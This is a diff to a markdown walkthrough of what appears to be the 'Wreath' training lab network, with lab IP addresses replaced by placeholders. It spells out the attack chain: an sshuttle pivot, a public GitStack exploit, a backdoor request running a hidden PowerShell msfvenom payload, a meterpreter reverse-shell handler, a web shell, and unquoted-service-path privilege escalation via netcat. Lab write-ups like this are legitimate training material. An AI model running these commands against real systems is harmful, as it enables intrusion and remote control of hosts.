@@ -32,7 +32,7 @@ Initial exploitation of the public-facing server using CVE-2019-15107 (Webmin RC
 
 Once we have root access to Prod-srv, we establish an sshuttle tunnel to access the internal network:
 ```bash
-sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i ~/.ssh/root_srv_id_rsa" 10.200.180.0/24 -x 10.200.180.200 > /dev/null 2>&1 &
+sshuttle -r root@PROD_SRV_IP --ssh-cmd "ssh -i ~/.ssh/root_srv_id_rsa" 10.200.180.0/24 -x PROD_SRV_IP > /dev/null 2>&1 &
 ```
 
 ### Network Discovery
@@ -40,8 +40,7 @@ sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i ~/.ssh/root_srv_id_rsa" 10.200
 Transfer static nmap binary and enumerate internal hosts:
 ```bash
 # Transfer tools
-scp -i ~/.ssh/root_srv_id_rsa /path/to/nmap root@10.200.180.200:/tmp
-
+scp -i ~/.ssh/root_srv_id_rsa /path/to/nmap root@PROD_SRV_IP:/tmp
 
 # Discover hosts
 ./nmap -sn 10.200.180.0/24
@@ -68,6 +67,7 @@ scp -i ~/.ssh/root_srv_id_rsa /path/to/nmap root@10.200.180.200:/tmp
 
 Discovered GitStack running on port 80. Testing exploit 43777.py:
 ```bash
+# Change IP in the file to prod-srv
 dos2unix 43777.py
 python2 43777.py
 ```
@@ -101,12 +101,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=PROD_SRV_IP LPORT=15001 -f
 
 Navigate to the backdoor using Burp Suite.
 ```
-http://10.200.180.150/registration/login/?next=/gitstack/web/exploit-THACKLAB.php
+http://GIT_SRV_IP/registration/login/?next=/gitstack/web/exploit-USERNAME.php
 ```
 
-Youll see something similar to below.
+Send the request to repeater (CTRL+R). You'll see something similar to below.
 ```http
-POST /web/exploit-USERNAME.php HTTP/1.1
+POST /web/exploit-USERNAME.php HTTP/1.1   #Change this
 Host: GIT_SRV_IP
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -114,15 +114,28 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 Cookie: csrftoken=<UNIQUE_TO_YOUR_SESSION>; sessionid=<UNIQUE_TO_YOUR_SESSION>
-Content-Type: application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded   #Add this in
 Upgrade-Insecure-Requests: 1
 Content-Length: 576
 
-a=powershell.exe -nop -w hidden -e "MSFVENOM PAYLOAD HERE"
+a=powershell.exe -nop -w hidden -e "MSFVENOM PAYLOAD HERE"   #Add this in
 ```
-
 **Note:** URL encode the payload only, NOT the `a=` parameter.
+
+Start your multi/handler
+```
+service postgresql start && msfconsole -q
+use multi/handler
+set LHOST PROD_SRV_IP
+set LPORT 15001
+run
+```
+Now just execute your payload in burp and get a meterpreter session on the Git Server.
+
+The network flow looks a little like this now:
 ![Root on git-server](/assets/Images/Wreath/k-g.png)
+
+---
 
 ### Post-Exploitation
 
@@ -285,13 +298,13 @@ http://ROOT_SRV_IP/resources/uploads/shell-USERNAME.jpg.php?wreath=powershell.ex
 ---
 
 ### Enumeration
-```powershell
+
 Start by looking for non default services
 ```powershell
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 ```
 
-That returned an unquoted path. Check permissions
+That returned an unquoted path so check permissions
 ```powershell
 sc qc SystemExplorerHelpService
 ```
@@ -300,7 +313,7 @@ sc qc SystemExplorerHelpService
 
 We will be exploiting that unquoted service path. To do this we need to write a tiny C wrapper executable calling the netcat.exe we already put on the system then compile with mono before uploading to root-srv.
 
-```C
+```
 # Install mono
 sudo apt install mono-devel
 
